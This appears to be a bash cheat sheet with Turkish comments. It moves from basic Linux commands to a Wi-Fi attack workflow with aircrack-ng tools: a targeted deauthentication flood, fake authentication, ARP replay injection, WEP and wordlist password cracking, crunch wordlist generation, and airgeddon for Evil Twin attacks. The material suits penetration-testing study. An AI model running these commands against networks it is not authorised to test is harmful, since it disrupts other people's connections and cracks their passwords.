#!/bin/bash

# Mevcut dizindeki dosya ve dizinleri listeler.
ls

# test.txt adında yeni bir dosya oluşturur.
touch test.txt

# Terminal ekranındaki yazıları temizler.
clear

# test adlı dosyayı siler. (Sadece dosya için geçerlidir, dizinler için kullanılmaz.)
rm test

# Bir üst dizine geri gider.
cd ..

# Mevcut çalışma dizinini gösterir.
pwd

# test adında yeni bir dizin oluşturur.
mkdir test

# test dosyasını, var olup olmadığına bakılmaksızın zorla siler. (Dizinler için kullanılmaz.)
rm -f test

# test dizinini ve içindeki tüm dosya ve alt dizinleri siler.
rm -r test

# test dizinini ve içindeki tüm dosya ve alt dizinleri zorla ve onay istemeden siler.
rm -rf test

# Komutlar.txt dosyasını test dizinine taşır.
mv Komutlar.txt test/Komutlar.txt

# Komutlar.txt dosyasını test dizinine kopyalar.
cp Komutlar.txt test/Komutlar.txt

# Terminalde kök (root) yetkisi verir ve root kullanıcısına geçer.
sudo su

# Paket yöneticisinin paket listelerini günceller, depolardan en son paket bilgilerini alır.
apt update

# Yüklü tüm paketleri en son sürümlerine yükseltir.
apt upgrade

# Wireshark paketini indirir ve kurar.
apt install wireshark

# Depolarda belirtilen isimle eşleşen paketleri arar.
apt search <paket_ismi>

# 'test.txt' adlı metin dosyasını oluşturur veya mevcutsa açar ve düzenler.
nano test.txt

# 'test.txt' adlı dosyanın içeriğini terminalde görüntüler.
cat test.txt

# Bulunulan dizindeki tüm dosya ve klasörleri, gizli olanlar da dahil olmak üzere detaylı olarak listeler.
ls -la

# Ağ arayüzlerinin yapılandırmasını ve IP adreslerini gösterir. (Bazı sistemlerde 'ip addr' komutu kullanılabilir.)
ifconfig

# Kullanıcının yerel parolasını değiştirmek için kullanılır.
passwd

# 'google.com' alan adına 4 paket yollayarak ağ bağlantısını test eder.
ping -c 4 google.com

# Komutlar.txt dosyasının sahip olduğu dosya özniteliklerini gösterir.
lsattr Komutlar.txt

# Komutlar.txt dosyasının değiştirilemez ('immutable') özniteliğini kaldırır.
chattr -i Komutlar.txt

# 'vpnbook-ca149-tcp443.ovpn' yapılandırma dosyasını kullanarak VPN bağlantısı kurar.
openvpn vpnbook-ca149-tcp443.ovpn

# Belirtilen ağ arayüzünü monitör moduna alır.
airmon-ng start <interface>

# Monitör modundaki ağ arayüzü ile çevredeki Wi-Fi ağlarını tarar.
airodump-ng <interface>

# Belirli bir Wi-Fi ağı için ağ içi tarama yapar ve sonuçları 'test' dosyasına yazar.
airodump-ng --channel 2 --bssid 88:AC:C0:42:9C:F1 --write test wlan0mon

# İstediğiniz bir Wi-Fi ağındaki belirtilen cihaza 10.000 deauth paketi göndererek bağlantısını koparır.
aireplay-ng --deauth 10000 -a 88:AC:C0:42:9C:F1 -c 02:EB:D8:07:11:B2 wlan0mon

# İstediğiniz bir Wi-Fi ağına sahte bir bağlantı gerçekleştirir.
aireplay-ng --fakeauth 0 -a 88:AC:C0:42:9C:F1 -h 02:EB:D8:07:11:B2 wlan0mon

# İstediğiniz bir Wi-Fi ağına sahte bağlantı sonrası sahte bir paket enjeksiyonu gerçekleştirir.
aireplay-ng --arpreplay -b 88:AC:C0:42:9C:F1 -h 02:EB:D8:07:11:B2 wlan0mon

# WEP türündeki Wi-Fi ağlarını IVS dosyaları aracılığı ile kırarak şifresini çözer.
aircrack-ng test.cap

# Ağ arayüzlerinin IP ve MAC adreslerini gösterir.
ip addr

# CAP dosyası üzerinde 'wordlist.txt' ile şifre denemesi yapar.
aircrack-ng test.cap -w wordlist.txt

# 8 ile 9 karakter arasında, 'xy123' karakterlerini kullanarak wordlist oluşturur.
crunch 8 9 xy123 -o outputwordlist.txt

# Wordlist içinde 'emin' ifadesini arar.
cat wordlist.txt | grep emin

# Evil Twin saldırısı için kullanılan bir araçtır (birçok Wi-Fi saldırı türünü destekleyen bir araçtır).
airgeddon
